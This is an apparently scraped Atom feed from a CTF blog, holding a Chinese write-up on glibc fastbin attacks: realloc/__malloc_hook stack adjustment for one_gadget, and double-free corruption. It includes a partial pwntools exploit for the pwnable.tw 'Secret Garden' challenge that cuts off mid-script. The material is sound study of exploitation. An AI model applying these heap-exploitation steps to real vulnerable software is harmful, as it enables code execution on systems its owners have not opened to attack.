090b1092d341f380803914c776035412e563011aa1e80dd562a3990b758e725c09a8f26271bf33478be4e03d94c3402b72b402423fb191aebc81400db01d7e5565772ac50e8a4debcce94d107faf62c43ecd7c9f3f5cfb376ea45b5e0a78d6373f9a49eb047ba4ae73bba216ebf02dcd06569302e5a7e1832c115286011085efef017b2508274d53c4521f404f41378fdfa3595a8fc752107d89a5b7c9fe0468b2a81a139430a5c17bcebae4c65abfe887f54227b6e308b016195b07e1ecf5926d42b3495e2f94697996a58da1aedcc3635bbdde65c0d568a10c38bbc76cc719d71949320c929a462eb8f582df4052f4843af0863b2de3e455246f3ba1df4754d0db732568b5a44fb4bd88cba5740fcf85b3123241bae7dda2833d62a1a307ec1f3749a48f698d347a26672ad41cd1f8388db6226a866a24eecfeaa0cef59f2894f17623aaa1e96b826300653ccf4f6387427d3f3a2b7dbb242dbc2530108caf932bbd501f9751ec0353ff6969d9ea005295caec369981088e4d65806800b258346e99c73546a4a8f88f8a99632933aa9326ea4f59c815098efeb6b184589172f2e1a87f614bb11fdfd4fb7b46ad8e465b32c7bf047fd7ff4ee8c873cdb939ebc6faab6f001adda59f7d1a895071d13f797467ec7151bb999f057cbdcb19b51d50a198cec5dbc2ca0ba0e5e7878007225a38f880106ab486d56f728e90ddd31a318a4d06f58a9fdb95e1502a31a5562a54852cd427dbbdbd7ff06912da27c42ccd8c7e37302cf0efe8a9e3c848464c6d64d74e4c51e140678b8b78495c552def51bc07d50a565a8397389e61830dea4066e1da88cc55051c6bd5bf9e2ef129f2ddef10ef33bad766525ffc1f1712972272cfb52de597a4be891e855076628190aed7c848c77147bc893ab1918c174d4b2890d255d75a8992bf8ff90efa2928c6beb9d3560071dd441a2fabea7447d941ad618b644314ed45c1bee2e301858dd3804cfe2d1a964a8bc9cc37c03e31483e4d07326cb2f460c26e4a3b48694a974c5ebc232cc5ab64542e72579997bd26a7a092d245926f74ef95a3288bae65b3a3d074b38236fe8fb2ac757c0eb5267de945acae4e3b51419c29a91b2c40412275bbbdfbc9ae446c755b508cb9ba82965afdbdc6db2ca08165926f8833ecf23c3999cef5408f3501c45771ca4b451e7b330e50b082e11402eb649efc7c3e3955645a03d0a0e115bfee83f7aa2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn: Wanna Heap</title>
    <link href="https://n0nop.github.io/2020/04/17/pwn-Wanna-Heap/"/>
    <id>https://n0nop.github.io/2020/04/17/pwn-Wanna-Heap/</id>
    <published>2020-04-17T01:48:47.000Z</published>
    <updated>2020-04-17T04:32:11.462Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e4bacdbebcdb163f60d46adb904b1230a6753871ffaf3cbe940c092dde849f15"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Fastbin attack 小结</title>
    <link href="https://n0nop.github.io/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/"/>
    <id>https://n0nop.github.io/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/</id>
    <published>2020-04-15T02:01:55.000Z</published>
    <updated>2020-12-03T03:39:37.397Z</updated>
    
    <content type="html"><![CDATA[<p>这几天刷了四道题，巧了都是Fastbin attack，本来惯用的套路是直接onegadget打<code>__malloc_hook</code>，然后所有onegadget都打不通的情况也很常见，我之前所知道的仅仅局限于<code>__realloc_hook</code>和<code>__malloc_hook</code>的联合使用来调整堆栈，但是也有一定的局限性，这次结合pwnable.tw上的几道题以及CTFhub上收录的CISCN 2019的一道题，小小地总结一下Fastbin attack的一些套路。</p><a id="more"></a><h1 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h1><h2 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h2><ol><li>部分可以参考<a href="https://n0nop.com/2020/04/08/pwn-heap-Spirited-Away/#House-of-spirit-攻击原理" target="_blank" rel="noopener">House of Spirit</a>，写得比较详细了。</li><li>有看到过fastbin合并的操作，但是因为目前没有接触过所以在这里不涉及，欢迎补充</li></ol><h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><ol><li>malloc一个fastbin的时候，会检查该fastbin的size是否合法： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// Glibc 2.27</span></span><br><span class="line">   <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br></pre></td></tr></table></figure></li><li>与free一个fastbin不同，malloc一个fastbin不受该fastbin必须地址对齐的约束，也就是说只要size满足便可以任意分配</li><li>若有其他特征，欢迎补充</li></ol><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><p>鉴于由于经常遇到直接往<code>__malloc_hook</code>写onegadget，然后通过malloc触发的方法往往不管用的情况，提供一些解决方案。</p><h2 id="realloc-realloc-hook-malloc-hook"><a href="#realloc-realloc-hook-malloc-hook" class="headerlink" title="realloc, __realloc_hook, __malloc_hook"></a>realloc, __realloc_hook, __malloc_hook</h2><p>这种方法的思路主要是通过<code>realloc</code>来调整堆栈，使得满足onegadget的约束条件</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><br>直接查看<strong>GI__</strong>libc_realloc的汇编码（这里是Glibc 2.27）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a7cc30</span> &lt;__GI___libc_realloc&gt;:    <span class="keyword">push</span>   <span class="built_in">r15</span> </span><br><span class="line"><span class="number">0x7ffff7a7cc32</span> &lt;__GI___libc_realloc+<span class="number">2</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cc34</span> &lt;__GI___libc_realloc+<span class="number">4</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7cc36</span> &lt;__GI___libc_realloc+<span class="number">6</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7cc38</span> &lt;__GI___libc_realloc+<span class="number">8</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7cc39</span> &lt;__GI___libc_realloc+<span class="number">9</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3a</span> &lt;__GI___libc_realloc+<span class="number">10</span>&gt;:    <span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3e</span> &lt;__GI___libc_realloc+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x35238b</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7cc45</span> &lt;__GI___libc_realloc+<span class="number">21</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>] <span class="comment">; __realloc_hook</span></span><br><span class="line"><span class="number">0x7ffff7a7cc48</span> &lt;__GI___libc_realloc+<span class="number">24</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rax</span>,<span class="built_in">rax</span> <span class="comment">; test if __realloc_hook != NULL</span></span><br><span class="line"><span class="number">0x7ffff7a7cc4b</span> &lt;__GI___libc_realloc+<span class="number">27</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt; <span class="comment">; prepare to call __realloc_hook    </span></span><br><span class="line"><span class="number">0x7ffff7a7cc51</span> &lt;__GI___libc_realloc+<span class="number">33</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc54</span> &lt;__GI___libc_realloc+<span class="number">36</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc57</span> &lt;__GI___libc_realloc+<span class="number">39</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5a</span> &lt;__GI___libc_realloc+<span class="number">42</span>&gt;:    <span class="keyword">sete</span>   <span class="built_in">al</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5d</span> &lt;__GI___libc_realloc+<span class="number">45</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc60</span> &lt;__GI___libc_realloc+<span class="number">48</span>&gt;:    <span class="keyword">setne</span>  <span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc63</span> &lt;__GI___libc_realloc+<span class="number">51</span>&gt;:    <span class="keyword">and</span>    <span class="built_in">al</span>,<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc65</span> &lt;__GI___libc_realloc+<span class="number">53</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cc6b</span> &lt;__GI___libc_realloc+<span class="number">59</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">..............</span><br><span class="line"><span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cee5</span> &lt;__GI___libc_realloc+<span class="number">693</span>&gt;:   <span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cee9</span> &lt;__GI___libc_realloc+<span class="number">697</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7ceea</span> &lt;__GI___libc_realloc+<span class="number">698</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7ceeb</span> &lt;__GI___libc_realloc+<span class="number">699</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7ceed</span> &lt;__GI___libc_realloc+<span class="number">701</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7ceef</span> &lt;__GI___libc_realloc+<span class="number">703</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cef1</span> &lt;__GI___libc_realloc+<span class="number">705</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="number">0x7ffff7a7cef3</span> &lt;__GI___libc_realloc+<span class="number">707</span>&gt;:   <span class="keyword">jmp</span>    <span class="built_in">rax</span> <span class="comment">; jump to __realloc_hook to execute</span></span><br><span class="line"><span class="number">0x7ffff7a7cef5</span> &lt;__GI___libc_realloc+<span class="number">709</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cef8</span> &lt;__GI___libc_realloc+<span class="number">712</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351f69</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7ceff</span> &lt;__GI___libc_realloc+<span class="number">719</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf02</span> &lt;__GI___libc_realloc+<span class="number">722</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:[<span class="built_in">rax</span>],<span class="number">0xc</span></span><br><span class="line"><span class="number">0x7ffff7a7cf09</span> &lt;__GI___libc_realloc+<span class="number">729</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf0e</span> &lt;__GI___libc_realloc+<span class="number">734</span>&gt;:   <span class="keyword">xchg</span>   <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7ffff7a7b950</span> &lt;__GI___libc_free&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf15</span> &lt;__GI___libc_realloc+<span class="number">741</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf18</span> &lt;__GI___libc_realloc+<span class="number">744</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf1d</span> &lt;__GI___libc_realloc+<span class="number">749</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cf20</span> &lt;__GI___libc_realloc+<span class="number">752</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351e59</span>]</span><br></pre></td></tr></table></figure><p>如果仅仅关注<code>__realloc_hook</code>存在的情况，那么将上述代码提取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a7cc30 &lt;__GI___libc_realloc&gt;:    push   r15 </span><br><span class="line">0x7ffff7a7cc32 &lt;__GI___libc_realloc+2&gt;:    push   r14</span><br><span class="line">0x7ffff7a7cc34 &lt;__GI___libc_realloc+4&gt;:    push   r13</span><br><span class="line">0x7ffff7a7cc36 &lt;__GI___libc_realloc+6&gt;:    push   r12</span><br><span class="line">0x7ffff7a7cc38 &lt;__GI___libc_realloc+8&gt;:    push   rbp</span><br><span class="line">0x7ffff7a7cc39 &lt;__GI___libc_realloc+9&gt;:    push   rbx</span><br><span class="line">0x7ffff7a7cc3a &lt;__GI___libc_realloc+10&gt;:    sub    rsp,0x18</span><br><span class="line">0x7ffff7a7cc3e &lt;__GI___libc_realloc+14&gt;:    mov    rax,QWORD PTR [rip+0x35238b]   ; __realloc_hook     </span><br><span class="line">0x7ffff7a7cc45 &lt;__GI___libc_realloc+21&gt;:    mov    rax,QWORD PTR [rax] ; *__realloc_hook</span><br><span class="line">0x7ffff7a7cee0 &lt;__GI___libc_realloc+688&gt;:   mov    rdx,QWORD PTR [rsp+0x48]</span><br><span class="line">0x7ffff7a7cee5 &lt;__GI___libc_realloc+693&gt;:   add    rsp,0x18</span><br><span class="line">0x7ffff7a7cee9 &lt;__GI___libc_realloc+697&gt;:   pop    rbx</span><br><span class="line">0x7ffff7a7ceea &lt;__GI___libc_realloc+698&gt;:   pop    rbp</span><br><span class="line">0x7ffff7a7ceeb &lt;__GI___libc_realloc+699&gt;:   pop    r12</span><br><span class="line">0x7ffff7a7ceed &lt;__GI___libc_realloc+701&gt;:   pop    r13</span><br><span class="line">0x7ffff7a7ceef &lt;__GI___libc_realloc+703&gt;:   pop    r14</span><br><span class="line">0x7ffff7a7cef1 &lt;__GI___libc_realloc+705&gt;:   pop    r15</span><br><span class="line">0x7ffff7a7cef3 &lt;__GI___libc_realloc+707&gt;:   jmp    rax ; jump to *__realloc_hook to execute</span><br></pre></td></tr></table></figure><p>可以明显地看到在<code>realloc</code>开始，这里进行了6次<code>push</code>操作，以及一次<code>sub rsp,0x18</code>，再要跳转到<code>__realloc_hook</code>之前，这里又<code>pop</code>了6次，以及一次<code>add rsp,0x18</code>来进行平衡堆栈。<br><br>所以只要相应地减少<code>push</code>的次数或者直接跳转到<code>__GI___libc_realloc+14</code>的位置执行，就能达到压低栈帧的目的，以满足onegadgeat的约束条件。<br><br>因此，只要将<code>__malloc_hook</code>写入<code>realloc+X</code>，将<code>__realloc_hook</code>写入onegadget，救能达到调整栈的目的。至于<code>X</code>是多少，就可在调试的时候观察执行到onegadget的时候，栈的下方多少位置是0，然后再做相应调整。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc &#x3D;&#x3D;&gt; __malloc_hook(realloc+X) &#x3D;&#x3D;&gt; __realloc_hook(onegadget)</span><br></pre></td></tr></table></figure><p><br>注意，这种方法有时候不一定行得通，因为可能在可调整范围内并没有为0的栈位置，也有可能调整后原本为0的位置被改掉了。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>这里暂时没有办法提供举例，但是由于这个方法十分简单并且容易理解，所以讲讲原理就行了。</p><h2 id="fastbin-corruption"><a href="#fastbin-corruption" class="headerlink" title="fastbin corruption"></a>fastbin corruption</h2><p>由于fastbin存在的double free检测机制，会调用<code>malloc_printerr</code>，从而间接地调用<code>malloc</code>来触发<code>__malloc_hook</code>。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>原理就不多说了，就是利用fastbin double free corruption来调用<code>__malloc_hook</code>的同时，完成了对onegadget约束的满足。</p><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h4><p><code>delete</code>功能中存在很明显的free后没有清空指针的漏洞，可以进行fastbin double free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_number )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x63</span> &amp;&amp; (v1 = (_DWORD *)chunk_array[v2]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">        *v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(chunk_array[v2] + <span class="number">8L</span>L));</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要利用思路：</p><ol><li><p>首先free出一个unsorted bin然后分配这个unsorted bin，利用<code>view</code>功能leak出<code>unsorted bin-&gt;bk</code>中残留的<code>main_arena</code>地址，从而得到libc基址，计算出<code>__malloc_hook</code>的地址。</p></li><li><p>由于fastbin的分配有size检查，所以不能直接分配<code>__malloc_hook</code>处，而是要利用上方的一些地址的高字节<code>0x7F</code>来伪造size字段，从而完成目标内存分配:<br> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/malloc_hook.png" alt></p><p> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/size.png" alt></p></li><li><p>经过尝试，所有的onegadget都没办法直接打通，这里就需要借助fastbin double free corruption来间接触发<code>__malloc_hook</code>，这里使用的onegadget是条件为<code>[rsp+0x50]==NULL</code>的那个。<br>解题exp（有些地方有些奇怪是因为尝试过<code>realloc</code>调栈的方法，没成功，但懒得改了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name, color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Length of the name :"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"The name of flower :"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"The color of the flower :"</span>, color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name of the flower["</span> + str(index) + <span class="string">"] :"</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which flower do you want to remove from the garden:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">realloc_hook_offset = <span class="number">0x00000000003c3b08</span> <span class="comment"># libc.symbols["__relloc_hook"] # __malloc_hook = __realloc_hook + 0x8</span></span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf0567</span></span><br><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fast bin double free</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line"><span class="comment"># don't break the double free loop</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"\xe0"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">heap_addr = u64(view(<span class="number">2</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x10e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"E"</span> * <span class="number">8</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">main_arena = u64(view(<span class="number">5</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">realloc_hook = libc_base + realloc_hook_offset</span><br><span class="line">libc_realloc = libc_base + 